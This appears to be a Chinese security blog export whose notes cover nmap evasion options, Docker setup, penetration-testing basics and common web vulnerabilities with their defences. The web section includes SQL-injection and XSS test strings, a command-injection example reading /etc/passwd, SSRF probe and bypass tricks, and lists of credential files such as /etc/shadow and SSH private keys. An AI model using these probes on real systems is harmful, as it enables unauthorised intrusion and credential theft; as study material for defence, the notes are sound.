噪声攻击扫描，将自己的真实IP隐藏在大量的伪造IP中，ME表示真实IP 1-D &lt;decoy1,decoy2[,ME],...&gt; 源IP地址欺骗 1-S &lt;IP_Address&gt; 使用指定的网络接口 1-e &lt;iface&gt; 源端口欺骗 1-g &lt;portnum&gt; ; --source-port &lt;portnum&gt; 设置nmap代理(http,socks4) 1--proxies &lt;url1,[url2],...&gt; 将一个定制的payload附加到发送数据包 1--data &lt;hex string&gt; 将一个定制的ASCII字符串附加到发送数据包 1--data-string &lt;string&gt; 将随机数据附加到发送数据包 1--data-length &lt;num&gt; 用指定的ip选项发送数据包 1--ip-options &lt;options&gt; 设置IP TTL 1--ttl &lt;val&gt; MAC地址伪造 1--spoof-mac &lt;mac address/prefix/vendor name&gt; 用伪造的tcp/udp/sctp校验和发送数据包 1--badsum 输出标准输出 1-oN &lt;files&gt; XML输出 1-oX &lt;files&gt; 脚本小子输出 1-oS &lt;files&gt; Grep输出 1-oG &lt;files&gt; 同时输出三种主要格式 (标准格式、XML格式和Grep格式 ) 1-oA &lt;basename&gt; 显示详细信息，显示最大详细信息 12-v-vv 设置调试级别，设置最大调试级别 12-d [level]-dd 显示一个端口处于特定状态的原因 1--reason 只显示开放端口 1--open 显示发送和接收的所有数据包 1--packet-trace 显示主机接口和路由（用于调试） 1--iflist 附加到指定的输出文件 -oX，-oN，-oG会覆盖输出文件，此选项对输出文件进行追加(XML输出文件无效) 1--append-output 继续中断的扫描 使用选项并指定标准/Grep扫描输出文件，不允许使用其它参数，Nmap会解析输出文件并使用原来的格式输出。 Nmap将把新地结果添加到文件中，这种方式不支持XML输出格式 1--resume &lt;file&gt; 设置XSL样式表，转换XML输出为HTML 1--stylesheet &lt;path/URL&gt; 从Nmap引用样式表，用于更可移植的XML 1--webxml 禁止Nmap的XML输出关联任何XSL样式表 1--no-stylesheet 杂项启用IPv6扫描 1-6 启用操作系统检测、版本检测、脚本扫描和路由追踪 123456-A相当于-O-sV--script--traceroute 指定自定义Nmap数据文件位置 Nmap在运行时从文件中获得特殊的数据，这些文件有 nmap-service-probes， nmap-services， nmap-protocols， nmap-rpc， nmap-mac-prefixes和 nmap-os-fingerprints。Nmap首先 在--datadir选项说明的目录中查找这些文件。 未找到的文件，将在BMAPDIR环境变量说明的目录中查找。 接下来是用于真正和有效UID的~/.nmap或Nmap可执行代码的位置(仅Win32)；然后是是编译位置， 如/usr/local/share/nmap或/usr/share/nmap。 Nmap查找的最后一个位置是当前目录 1--datadir &lt;dirname&gt; 使用原以太网帧发送数据 要求Nmap在以太网(数据链路)层而不是IP(网络层)发送报文 1--send-eth 使用原IP数据包发送数据 1--send-ip 假定用户具有全部权限 告诉Nmap假定其具有足够的权限进行源套接字包发送、报文捕获和类似UNIX系统中根用户操作的权限。 1--privileged 假设用户缺少原始socket特权 1--unprivileged 打印版本信息 1-V ; --version 帮助信息 1-h ; --help Nmap常用脚本脚本默认存放位置 1/xx/nmap/scripts 常用脚本分类 auth：负责处理鉴权证书(绕过)的脚本 broadcast：在局域网内探查更多服务的开启情况 brute：对常见的应用进行暴力破解 default：使用-sC或-A选项扫描时的默认脚本 discovery：对网络进行更多的信息收集 dos：用于拒绝服务攻击 exploit：利用已知漏洞入侵系统 external：利用第三方的数据库或资源查询目标地址信息 fuzzer：模糊测试脚本 intrusive：入侵性脚本，可能被目标IPS/IDS发现 malware：探测目标是否感染病毒，开启后门等信息 safe：安全性脚本 version：负责增强服务与版本扫描功能的脚本 vuln：负责检查目标是否存在常见漏洞]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker核心概念与安装部署]]></title>
    <url>%2F2018%2F07%2F31%2FDocker%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[Docker核心概念镜像​ 只读的模板。类似与.iso系统镜像。 ​ 通过版本管理和增量文件系统，Docker可以十分简单的创建和更新现有的镜像，也可以从网上下载镜像直接使用。 ​ 镜像是创建Docker容器的基础。 容器​ 类似于轻量级的沙箱，Docker利用容器来运行和隔离应用。 ​ 容器是从镜像创建的应用运行实例。可以将容器启动，开始，停止，删除。 ​ 各容器间彼此相互隔离，互不可见。 镜像是只读的，容器从镜像启动时，会在镜像的最上层创建一个可写层 仓库​ 仓库注册服务器(Registry)：存放仓库的地方 ​ Docker仓库：集中存放同一类镜像文件的场所，通过不同的标签区分镜像 ​ 公开仓库：官方Docker Hub；国内时速云，阿里云 ​ 私有仓库：支持本地网络内创建私有仓库 Docker安装​ Docker支持Linux，Windows，MacOS，及云平台 ​ 下载：https://www.docker.com/get-docker Centos7 环境下安装Docker系统要求64位，内核版本不低于3.10，推荐使用CentOS 7系统 1uname -r #查看内核版本信息 安装并启动Docker123yum update -yyum -y install dockersystemctl start docker 验证安装1docker version 配置Docker设置镜像12345vim /etc/docker/daemon.json&#123; &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]&#125; 重启Docker12systemctl daemon-reloadsystemctl restart docker.service Centos7 环境下安装最新版Docker安装依赖库123yum install -y yum-utils \ device-mapper-persistent-data \ lvm2 设置存储库12yum-config-manager \ --add-repo \ https://download.docker.com/linux/centos/docker-ce.repo 如果生产建议使用稳定库，如果要使用edge或test，则执行如下命令启用12yum-config-manager --enable docker-ce-edgeyum-config-manager --enable docker-ce-test 关闭防火墙12systemctl stop firewalld.service #停止systemctl disable firewalld.service #禁用 安装1yum install docker-ce 启动1systemctl start docker 验证安装1docker version Ubuntu16.04 环境下安装Docker64位，内核版本不低于3.10 准备安装环境12345apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 添加docker的官网GPG秘钥1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 添加apt源1234add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 安装12apt-get updateapt-get install -y docker.io 启动docker服务1service docker start 验证安装1docker version]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker简介]]></title>
    <url>%2F2018%2F07%2F31%2FDocker%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[什么是Docker​ Docker要实现“Build，Ship and Run Any App，Anywhere”，即通过对应用的封装（Packaging），分发（Distribution），部署（Deployment），运行（Runtime）生命周期进行管理，达到应用组件“一次封装，到处运行”的目的。 Docker提供了各种容器管理工具（如分发，版本，移植等），让用户无需关注底层的操作，可以简单明了的管理和使用容器；其次，Docker通过引入分层文件系统构建和高效的镜像机制，降低迁移难度，极大提升用户体验。 为什么要使用DockerDocker虚拟化的好处​ 一次封装，到处运行。解耦应用和运行平台。 Docker在开发和运维中的优势​ 更快速的交付与部署 ​ 更高效的资源利用 内核级虚拟化 ​ 更轻松的迁移和扩展 多平台支持 ​ 更简单的更新管理 Docker与虚拟机比较​ Docker技术与传统虚拟机技术的特性比较 特性 Docker 虚拟机 启动速度 秒级 分钟级 性能 接近原生 较弱 内存代价 很小 较多 硬盘使用 MB GB 运行密度 单机支持上千容器 几十个 隔离性 安全隔离 安全隔离 迁移性 优秀 一般 Docker与虚拟化比较]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试简介]]></title>
    <url>%2F2018%2F07%2F30%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[2019年重大安全事件 WinRAR被曝存在遗留19年的漏洞，影响全球多达5亿用户 根据研究人员研究，该问题是因UNACEV2.dll代码库中的一个深藏已久的漏洞引起的，而且该代码库从2005年以来就一直没有被主动使用过。据了解，该代码库用于解析ACE格式，这是一种可以追溯到20世纪90年代常用的压缩格式。 攻击者可以制作一个恶意的ACE文件，当被WinRAR打开的时候，会利用UNACEV2.dll中的路径遍历漏洞欺骗归档工具将文件解压到攻击者选择的路径中。研究人员试图将ACE恶意文件放到启动文件夹中以便在系统启动时执行 研究人员披露WiFi WPA3标准中的“龙血”漏洞 “龙血”漏洞共有五个，包括拒绝服务攻击、两个降级攻击和两个侧通道信息泄露漏洞。拒绝服务攻击漏洞危害程度较低，只会导致使用WPA3的接入点崩溃，其他四个可用于获取用户密码。两个降级攻击和两个侧通道信息泄露漏洞都是WPA3标准的Dragonfly密钥交换中的设计缺陷引起，这是一种客户端在WPA3路由器或接入点上进行身份验证的机制。在研究人员发布漏洞信息后，WiFi联盟表示WPA3标准已经添加了安全更新，修复了“龙血”漏洞 Oracle WebLogic爆出零日漏洞 4月17日，国家信息安全漏洞共享平台（CNVD）公开了Weblogic反序列化远程代码执行漏洞（CNVD-C-2019-48814）该零日漏洞会影响所有启用wls9_async_response.war和wls-wsat.war组件的Weblogic版本，包括最新版本。攻击者可以利用此漏洞通过发送特制的HTTP请求，在未经授权的情况下远程执行命令。根据CNCERT/CC发布的CNTA-2019-0015公告，该漏洞会影响WebLogic 10.x和WebLogic 12.1.3版本。甲骨文尚未解决这一关键漏洞。安全专家建议禁用易受攻击的模块wls9_async_response.war和wls-wsat.war，或禁止在Oracle WebLogic安装中访问URL地址/ _async / *和/ wls-wsat / *。4月26日，Oracle官方发布紧急补丁，并为该漏洞分配编号CVE-2019-2725 Bilibili后台源码“被开源”，GitHub公开其DMCA(数字千年版权法)删除通知 4月22日，哔哩哔哩后台源码在GitHub上“被开源”，引发了很多用户关注，几个小时后，该项目被屏蔽。4月24日，GitHub公开了哔哩哔哩发来的DMCA删除通知。通知中哔哩哔哩请求GitHub删除相关源码，最后一句还用上了三个感叹号，在网上引发热议 “等保2.0”正式发布，12月1日正式实施 2019年5月13日下午，国家市场监督管理总局召开新闻发布会，期待已久的等保2.0正式发布。根据最新的消息，等保2.0将在2019年12月1日正式实施 从等保1.0到等保2.0，变化体现在多个方面，差异主要体现在： 体系框架和保障思路的变化 定级对象的变化 测评的变化 等保要求的组合变化 控制点和要求项的变化 Windows再曝WannaCry级漏洞CVE-2019-0708 在WannaCry两周年之际，Windows再次被曝出存在高危远程漏洞。5月14日，微软官方发布了5月安全更新补丁共修复了82个漏洞，其中包含针对远程桌面（RDP）服务远程代码执行漏洞CVE-2019-0708 远程桌面服务（以前称为终端服务）中存在远程执行代码漏洞CVE-2019-0708修复程序，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。此漏洞是预身份验证，无需用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序; 查看、更改或删除数据；或创建具有完全用户权限的新帐户。要利用此漏洞，攻击者需要通过RDP向目标系统远程桌面服务发送特制请求 CVE-2019-0708漏洞影响范围： Windows 7 Windows Server 2008 R2 Windows Server 2008 Windows Server 2003（已停止维护） Windows XP（已停止维护） 安全问题的根源分层思想的优劣分层思想会将大问题分解为小问题，将小问题进行逐一解决，这利于问题的解决 在信息安全方面，分层思想同样会有利于安全问题的解决。但因为分层思想的局限性，每个人都只会专注于某一层的安全性，将所有的方面组合起来，可能会存在木桶原理。一个信息系统的安全，包括物理环境、网络架构、服务器、数据库、应用系统、人员等等方面，将各方面统一融合，才会实现信息系统的坚固性 只追求功能的实现最大的安全威胁是人恶意攻击者的攻击方向由服务端转向客户端 渗透测试简介用实际的攻击进行安全测试和评估的方法 尝试挫败安全防御机制，发现系统安全弱点 从攻击者的角度思考，测量安全防护有效性 证明安全问题的存在，而非破坏 分类黑盒测试外部测试，测试者从外部网络攻击被测试网络，模拟真实网络攻击，不了解任何目标网络环境信息，有组织，有步骤的对目标网络进行逐步渗透与入侵。 优点：可以对目标组织内部的安全团队的检测与响应能力做出评估 缺点：时间周期长，技术要求高 白盒测试内部测试，可以了解到目标环境所有内部与相关信息，以最小的代价发现和验证系统中最严重的漏洞 优点：不需要情报收集与确定目标，可以集成在部署和开发周期中，代价小，时间低 缺点：无法有效测试目标组织的应急响应水平，无法判断出目标组织的安全防护计划对特定攻击的检测效率 灰盒测试结合白盒与黑盒各自的特性 执行标准 osstmm：安全测试方法学开源手册 NIST SP 800-42：网络安全测试指南 owasp top 10：十大web应用安全威胁项目 WASC-TC：web安全威胁分类标准 PTES：渗透测试执行标准 PTES前期交互阶段 (Pre-Engagement Interaction)测试者与客户交互讨论，确定测试范围，目标，限制条件及服务合同细节。 收集客户需求，准备测试计划，定义测试范围与边界，定义业务目标，项目管理与规划 情报收集阶段（Informatin Gathering）获取目标组织网络拓扑，系统配置与安全防御措施的信息 被动信息收集：DNS信息收集，Google Hacking，社会工程学，网络踩点，被动监听 主动信息收集：扫描探测，服务检查,漏洞扫描 威胁建模阶段（Threat Modeling）测试团队通过情报分析，确定出最可行的攻击通道 漏洞分析阶段（Vulnerablity Analysis）考虑如何取得目标系统的访问控制权，找出可以实施渗透攻击的攻击点，并在实验环境中验证 渗透攻击阶段（Exploitation）测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。 此阶段中，测试者需挫败目标的安全防御机制，并且在黑盒测试中，不可被目标组织安全团队发现，清除痕迹 后渗透测试阶段（Post Exploitation）测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。 渗透测试报告阶段（Reporting）这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。 安全漏洞安全漏洞安全漏洞指信息系统中存在的缺陷或不适当的配置，它们可使攻击者在未授权的情况下访问或破坏系统，导致信息系统面临安全风险。 渗透代码（Exploit）漏洞利用代码，利用安全漏洞来造成入侵或破坏效果的程序 验证代码（POC）漏洞验证代码，用于测试相关系统是否存在特定漏洞 安全漏洞生命周期 安全漏洞研究与挖掘 渗透代码开发与测试 概念验证性的渗透攻击代码（POC），用于验证找到的安全漏洞是否确实存在，并确认其是否可被利用 安全漏洞和渗透代码在封闭团队中流传 安全漏洞和渗透代码开始扩散 恶意程序出现并开始传播 渗透代码/恶意程序大规模传播并危害互联网 渗透代码/攻击工具/恶意程序逐渐消亡 Kali Linux简介基于Debian的Linux发行版本 前身为BackTrack 5 用于渗透测试和安全审计 官方统计包含600+安全工具 可定制内核，支持ARM和手机平台 开源免费 策略 Kali Linux以root用户登陆系统及进行操作 Kali Linux默认未启动任何网络服务 Kali Linux现为rolling release更新方式，经常性不定期更新系统及程序]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB安全]]></title>
    <url>%2F2018%2F07%2F29%2FWEB%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[HTPP协议HTTP1.0请求方法：GET,POST,HEAD HTTP1.1请求方法：OPTIONS,PUT,DELETE,TRACE,CONNECT HEAD请求方式： 只返回头部数据，数据部分不返回内容 OPTIONS请求方式：（需跨域时设置此请求方式） 返回服务器允许的请求类型 PUT请求方式： 在特定的目录中上传指定文件，文件名在url中设置 DELETE请求方式： 删除特定目录中的文件，文件名在url中设置 TRACE请求方式： 让服务器端将客户端所有的请求返回给客户端，多用于debug需求 CONNECT请求方式： 用于特定应用使用http协议时使用（使用http长链接的程序） URL同源策略URL格式中，协议，主机，端口三部分相同，视为同源 注入漏洞 SQL注入 概念构造特殊请求，使web应用执行带有附加条件的SQL语句，web应用访问数据库时回附带其他命令造成数据库的意外输出 影响读取，修改数据库中的库和表；执行系统命令 注入类型简单注入 基于布尔型注入：根据返回页状态判断条件真假 121&apos; and &apos;1&apos;=&apos;1 / 1&apos; and &apos;11&apos; and &apos;1&apos;=&apos;2 / 1&apos; and &apos;0 基于报错的注入：根据页面返回错误信息 1234&apos;&quot;%() 基于时间的注入：根据页面返回时间 基于联合查询的注入：使用union 基于堆查询的注入：同时执行多条语句注入 盲注不会返回错误信息，执行正确与执行错误返回不同的页面，据此判断是否注入成功。 注入方式暴库-&gt;暴表-&gt;暴字段-&gt;暴记录 出现SQL注入的原因与防范 数据库可执行系统命令 最小化权限账户启动数据库 禁止让数据库执行系统命令 连接数据库用户权限过大 IDS,WAF 连接数据库用户权限最小化 错误信息返回过多 统一错误信息管理 禁止向用户提供错误信息 服务器对请求内容过滤不严格 过滤所有客户端数据 审核数据 XML注入 概念XML文件一般用于存储数据及配置，如果在修改或新增数据时，没有对用户可控数据做转义，直接输入或者输出数据，都将导致XML注入漏洞 产生原因 传输的数据包含了标签内容 修改数据时会覆盖原有标签 防范 对用户输入进行检查 对特殊字符进行转码 代码注入 远程文件包含漏洞概念在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至是恶意的代码注入 如果PHP的配置选项allow_url_include为ON，则include/require函数是可以加载远程文件的，此被称为远程文件包含漏洞 PHP常见文件包含函数123456include()include_once()require()require_once()fopen()readfile() 影响 利用代码注入漏洞执行任意代码，来操作服务器 利用代码注入漏洞操作数据库，插入恶意数据，可能获取系统权限 利用代码注入漏洞修改系统配置，修改网络配置 进行代码注入攻击后可以进一步对网络渗透 审计方法查看是否包含如下代码： 123456include()include_once()require()require_once()fopen()readfile() 防范 不需要执行远程代码时，修改php.ini配置 12allow_url_fopen=Offallow_url_include=Off 不可直接导入用户输入内容 执行代码的参数，或文件名，禁止与用户输入相关，只可由开发人员定义代码内容 本地文件包含概念读取任意本地文件，在条件允许时甚至可以执行代码 可以通过远程文件包含漏洞来生成本地文件包含漏洞的代码来利用 影响 上传各类格式木马文件，然后包含利用 读敏感文件 包含日志文件 包含/proc/self/envion文件 包含data:或php://input等伪协议 若有phpinfo则可包含临时文件 执行任意代码 包含具有恶意文件的网站 控制服务器 PHP常见文件包含函数123456include()include_once()require()require_once()fopen()readfile() PHP文件中的封装协议–访问本地文件12file:// #访问本地文件系统php://filter #对本地磁盘文件进行读写 PHP文件中的封装协议–代码任意执行12php:// #访问各个输入/输出流data:// #伪协议，将原本的include文件流重定向到用户可控制的输入流中 PHP文件中的封装协议–目录遍历1glob:// #伪协议，查找匹配的文件路径模式 防范不要直接导入用户输入的内容（与远程文件包含漏洞相同） 命令执行漏洞概念用户通过浏览器提交执行命令，由于服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下执行命令，可能会允许攻击者通过改变$PATH或程序执行环境的其他方面来执行一个恶意构造的代码 可用作命令执行的符号： 1234567&amp;&amp;&amp;|||`$()-exec(find函数中) 例：1cat ` cat /etc/passwd ` 影响 使用web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 当作跳板机进一步内网渗透 各语言执行系统命令的函数PHP123system()：输出并返回最后一行shell的结果exec()：返回最后一行shell结果，所有结果可以保存到一个数组中passthru()：调用命令，将运行结果原样输出到标准输出设备上 JSP1Runtime.getRuntime().exec(&lt;commandstr&gt;) 第三方组件存在的代码执行漏洞Struts2漏洞（s2-16） 2.3.15.1以前版本中没有对action:,redirect:,redirectAction:等进行处理，导致ongl表达式可以被执行 防范PHP 尽量不执行外部命令 使用脚本解决工作，少用执行命令函数，php中禁止disable_functions 使用自定义函数或函数库来替代外部命令的功能 程序参数，escapshellcmd过滤 程序参数值，escapeshellarg过滤 参数值使用引用号包裹，并在拼接前调用addslashes转义 使用safe_mode_exec_dir指定可执行文件路径 XSS漏洞 概念XSS（跨站脚本漏洞）,hack在web页面中插入恶意js代码，当用户浏览此网页时，js代码会被执行，达到恶意攻击的目的 风险 盗取用户cookie 操控用户浏览器 下载木马 修改页面内容，钓鱼攻击 存储型XSS 概念持久化，恶意js代码存储在服务器中 流程hack将恶意js代码插入web请求中，传送给服务器，服务器未经过过滤存于数据库中。当其他用户访问此页面时，服务器会将带有恶意js代码的页面返回至浏览器，造成恶意js代码的执行 诱骗受害者点击链接：将长链接转换为短链接（网址缩短） 风险 盗取cookie 钓鱼攻击 修改页面内容，获取用户信息 生成蠕虫，利于扩散 检测：(表单输入框)1234567&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;&lt;img src=javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;&lt;img dynsrc=javascipt:alert(&quot;1&quot;)&gt;&lt;/img&gt;&lt;div style=&quot;background-image:url(javascipt:alert(&apos;1&apos;))&quot;&gt;&lt;img src=&quot;knownsec&quot; onerror=alert(&apos;1&apos;)&gt;&lt;font style=&quot;TEST&quot;:expression(alert(&apos;1&apos;))&gt;table标签 a标签 ul标签 防范 浏览器解析顺序：HTML-&gt;CSS-&gt;JavaScript 浏览器解码顺序：HTML-&gt;URL-&gt;JavaScript 对HTML中不可信字符进行转义，为属性值加引号，不可加反引号(`) 按照HTML转义，后js转义的顺序进行转义 创建用户可提交标签和属性白名单 使用utf-8字符编码及设置content为text/html 不要将用户可控制的文本放在&lt;meta&gt;标签前 使用&lt;!DOCTYPE html&gt; 反射型XSS 概念不可存储在服务器中，通过浏览器解析后返回到浏览器 过程构造有恶意js脚本的网站连接，诱骗受害者点击连接，向服务器发送请求，服务器解析地址后返回至受害者，受害者浏览器执行js造成XSS攻击 防范同存储型XSS DOM型XSS 概念不可存储在服务器中，不需服务器做解析 过程与反射型XSS相似，不同的是浏览器执行时取url中的参数，而不使用服务器返回的过滤后的参数（纯粹是JS取代了URL的内容） 检测 网站代码中存在document.location document.URL document.referrer类似的可提取url内容的代码，就可能存在DOM型XSS漏洞 防范 写入页面前先转义 慎用eval() 编写安全的函数方法，从可靠的数据源获取参数 参考使用filter.js库 请求伪造漏洞 SSRF漏洞 概念服务器请求伪造，是一种攻击者伪造服务器请求的安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 出现原因对于提供了从其他服务器上获取数据的功能的web应用，如果存在缺陷，攻击者可利用此web应用作为代理攻击远程和本机的服务器。 如果web应用没有对用户提供的URL和远端服务器返回的信息进行合理的验证和过滤，就可能存在SSRF漏洞 攻击者利用SSRF漏洞可以实现绕过网络限制攻击企业内网 流程 攻击方式 信息收集：对外网，服务器所在内网，本地进行端口扫描，获取服务banner信息 信息收集：对内网web应用进行指纹识别，通过访问默认文件实现 信息收集：利用file协议读取本地文件等 执行指令：攻击内外网的web应用，使用get参数 执行指令：溢出，攻击运行在内网或本地的应用程序 产生原因 应用从用户指定的url获取图片，并使用一个随机的文件名保存在硬盘上，并展示给用户 应用获取用户指定url的数据，这其中会使用socket跟服务器建立tcp连接，传输原始数据 应用根据用户提供的url，抓取用户的web站点，并自动生成移动wap站点 应用提供测速功能，能够根据用户提供的url，访问目标站点，以获取其在对应经纬度的访问速度 利用SSRF进行端口探测1http://0.0.0.0/xx.php?url=http://1.1.1.1:22 返回值若为服务banner信息，说明此目标端口开放 检测方法PHP123file_get_contents()fsockopen()curl_exec() 以上三个函数使用不当会造成SSRF漏洞 JSP12345Request类URL类的openStreamHttpClient类URLConnectionHttpURLConnection类 以上函数使用不当会造成SSRF漏洞 绕过方法 添加端口号 短网址绕过 指向任意IP的域名xip.io 123410.0.0.1.xip.io resolves to 10.0.0.1www.10.0.0.1.xip.io resolves to 10.0.0.1mysite.10.0.0.1.xip.io resolves to 10.0.0.1foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1 IP限制绕过 各进制转换，各进制组合转换 协议限制绕过 防范 过滤返回信息，验证远程服务器对请求的响应 统一错误信息，避免用户根据错误信息判断远端服务器的端口状态 限制请求的端口为http常用端口 黑名单内网IP，避免获取内网数据，攻击内网 禁用不需要的协议，仅允许http和https请求 CSRF漏洞 概念跨站请求伪造，攻击者利用被攻击者的身份发起了某些被攻击者不知情的网络请求 影响 以被攻击者的名义发送邮件 以被攻击者的名义发送消息 盗取被攻击者账号 使用被攻击者信息购买商品 虚拟货币转账 流程 漏洞利用条件 被攻击者登陆过网站（获取Cookie） 被攻击者打开攻击者提供的恶意连接 网站除了验证Cookie，不进行二次验证 防范 GET、POST的正确使用 Referer Check，http头中字段，用于标识此次请求从哪个页面跳转过来的 Anti CSRF Token 验证码 重要操作做二次验证 文件处理漏洞 任意文件上传 漏洞产生原因web应用程序在处理用户上传的文件操作时，如果用户上传文件的路径，文件名，扩展名成为用户可控的数据，就会导致直接上传脚本木马到web服务器上，直接控制web服务器 文件上传时检查不严 没有进行文件格式检查 在客户端进行了格式检查-很容易被绕过 在服务器端进行了不严格的黑/白名单检查 可使用%00等截断方式绕过 使用大小写方式绕过黑名单 只对文件类型(Content-Type)进行了检查 危害 文件是一个webshell，可以任意执行系统命令 与后台数据库连接，任意执行数据库命令 把本服务器当作跳板，访问局域网内任意服务器 获取服务器登陆权限 检测方法检测点：所有可上传文件的页面 检测方法： 使用什么方式来限制文件类型 是否对文件名进行重命名 是否允许用户重命名文件名 防范 文件上传的目录设置为不可执行 判断文件类型 文件类型判断，后缀名判断 白名单策略 对于图片处理，使用resize函数来破坏源代码 使用随机数来存储文件 防止多后缀文件引起的漏洞 单独设置文件服务器的域名 此服务器不可运行任何动态网页 此服务器只可静态访问HTML,图片等 任意文件下载 概念web服务器由于业务需求，需提供文件查看或文件下载功能，若对用户查看或下载的文件不做限制，则恶意用户就能查看或下载任意敏感文件，这就是文件查看与下载漏洞 检测方法 查找传入文件名的参数 导入文件等参数，要是直接输入文件名，就可能有注入点 注意如下参数名： RealPath,FilePath,filepath,Path,path,inputFile,url,urls,Lang,dis,data,readfile,filep,src,menu,META-INF,WEB-INF 在代码中查找漏洞 PHP中：存在readfile,fopen,file_get_contents等代码，可能存在任意文件下载漏洞 敏感文件路径-Windows12345678C:\boot.ini # 查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml # IIS配置文件C:\Windows\repair\sam # 存储系统初次安装时的密码C:\Program Files\mysql\my.ini # Mysql配置文件C:\Program Files\mysql\data\mysql\user.MYD # Mysql rootC:\Windows\php.ini # php配置信息C:\Windows\my.ini # Mysql配置信息数据库链接文件 敏感文件路径-Linux12345678910111213/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*/proc/mounts/proc/config.gz数据库链接文件 防范PHP为例： 过滤.，使用户在url中不能回溯上级目录 使用正则严格判断用户输入参数的格式 php.ini配置open_basedir限定文件访问范围 访问控制漏洞 横向越权 正常访问流程访问自己的信息页 修改自己密码 概念 越权漏洞属于逻辑漏洞。利用业务逻辑在程序中体现时，仅仅限制于用户点击 Web应用程序接收到用户请求，修改某条数据时，没有判断数据的所属人，或者在判断数据所属人时从用户提交的表单参数中获取了userid，导致攻击者可以自行修改userid，修改不属于自己的数据 只要权限验证不使用cookie验证，都可能发生横向越权漏洞 所有的更新语句操作，都可能产生此漏洞 影响 以其他用户的身份进行操作 查看/遍历内容 更改信息 发表文章 所带来的影响 更改确认邮箱/手机号，可进行支付操作 查看其他用户信息，收集隐私信息 发布敏感文章 检测方法 查看任何传递用户信息的参数 只要是用户id，用户名等以参数的方式传递，就可能有风险 查看特权内容，是否进行了权限管理 防范 修改程序逻辑 用户id，用户名等禁止通过参数来传递，直接取cookie中的值 私有信息访问时需要验证用户身份 无法修改程序逻辑，通过混淆的方法防御 用户id使用MD5等编码，很难进行遍历 垂直越权 概念由于Web应用没有做权限控制，或仅仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的 影响 垂直权限漏洞，一般是直接访问业务管理员权限 可能会看到全部用户信息 可能更改全部通告信息 可能更改商品价格 可能更改订单信息 只要是能拿到业务管理员权限，可能对业务造成很大影响 防范在每个页面的加载之前进行权限验证 进行服务器验证，不可做前台验证 验证时，从session获取对应的用户信息 session中用户信息存放在服务端，用户不可修改 对每个敏感页面都进行验证 会话管理漏洞 会话劫持 概念通过获取用户session id后，使用该session id登陆目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效session。 会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户 攻击步骤 目标用户需要先登陆站点 登陆成功后，该用户会得到站点提供的一个会话标识session id 攻击者通过某种攻击手段捕获session id 攻击者通过捕获到的session id访问站点即可获取目标用户合法会话 如何获取cookie 了解cookie接口 找到session id位置 进行破解 暴力破解：尝试各种session id，直到破解为止 预测：如果session id使用非随机的方式产生，那么极有可能计算出 窃取：XSS攻击，中间人攻击等方法获取 影响 冒充他人进行操作 对站点的影响 HTTP-Only服务端发送cookie时，可以设置HTTP-Only 优点是设置HTTP-Only的参数不会被js获取 secure当设置cookie的某个值的secure为true时 此cookie只有在HTTPS协议中才会进行传输 防范 由XSS漏洞引起的会话劫持 使用HTTP-Only来防止js获取cookie中的session id信息 中间人攻击引起的会话劫持 使用https+secure来保证session id不被获取 会话固定 概念会话固定是一种诱骗受害者使用攻击者指定的会话标识(session id)的攻击手段。 这是攻击者获取合法会话标识的最简单的方法 会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以强迫受害者使用攻击者设定的一个有效会话，以此来获取用户的敏感信息 原理 访问网站时，网站会设置cookie中的session 当用户登录后，cookie中的session保持不变 只要获取登陆前的session内容，就可以知道登陆后的session 检测方法 访问网站(未登录) 获取cookie信息，获取session id 登陆网站 查看cookie信息，获取session id 查看登陆前，登陆后的session 